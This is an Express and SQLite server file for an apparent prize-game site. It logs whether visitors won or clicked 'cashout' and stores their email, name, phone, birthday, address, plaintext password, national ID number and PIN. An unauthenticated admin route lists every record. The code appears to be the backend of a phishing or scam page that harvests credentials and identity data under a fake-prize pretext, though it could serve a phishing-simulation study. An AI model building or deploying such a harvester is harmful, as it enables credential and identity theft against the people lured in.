import express from "express";
import { createServer as createViteServer } from "vite";
import Database from "better-sqlite3";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const db = new Database("database.sqlite");

// Initialize database
db.exec(`
  CREATE TABLE IF NOT EXISTS participants (
    id TEXT PRIMARY KEY,
    played_game INTEGER DEFAULT 0,
    won INTEGER DEFAULT 0,
    clicked_cashout INTEGER DEFAULT 0,
    attempted_input INTEGER DEFAULT 0,
    id_number TEXT,
    id_pin TEXT,
    currency TEXT,
    prize TEXT,
    email TEXT,
    full_name TEXT,
    phone TEXT,
    birthday TEXT,
    address TEXT,
    password TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API Routes
  app.post("/api/participant", (req, res) => {
    const { id, email, full_name, phone, birthday, address, password, played_game, won, clicked_cashout, attempted_input, id_number, id_pin, currency, prize } = req.body;
    
    const stmt = db.prepare(`
      INSERT INTO participants (id, email, full_name, phone, birthday, address, password, played_game, won, clicked_cashout, attempted_input, id_number, id_pin, currency, prize)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      ON CONFLICT(id) DO UPDATE SET
        email = COALESCE(excluded.email, participants.email),
        full_name = COALESCE(excluded.full_name, participants.full_name),
        phone = COALESCE(excluded.phone, participants.phone),
        birthday = COALESCE(excluded.birthday, participants.birthday),
        address = COALESCE(excluded.address, participants.address),
        password = COALESCE(excluded.password, participants.password),
        played_game = excluded.played_game,
        won = excluded.won,
        clicked_cashout = excluded.clicked_cashout,
        attempted_input = excluded.attempted_input,
        id_number = COALESCE(excluded.id_number, participants.id_number),
        id_pin = COALESCE(excluded.id_pin, participants.id_pin),
        currency = COALESCE(excluded.currency, participants.currency),
        prize = COALESCE(excluded.prize, participants.prize)
    `);

    try {
      stmt.run(id, email, full_name, phone, birthday, address, password, played_game ? 1 : 0, won ? 1 : 0, clicked_cashout ? 1 : 0, attempted_input ? 1 : 0, id_number, id_pin, currency, prize);
      res.json({ success: true });
    } catch (error) {
      console.error(error);
      res.status(500).json({ error: "Database error" });
    }
  });

  app.get("/api/admin/participants", (req, res) => {
    const participants = db.prepare("SELECT * FROM participants ORDER BY timestamp DESC").all();
    res.json(participants);
  });

  app.get("/admin", (req, res) => {
    res.redirect("/#admin");
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    // Serve static files in production
    app.use(express.static(path.join(__dirname, "dist")));
    app.get("*", (req, res) => {
      res.sendFile(path.join(__dirname, "dist", "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
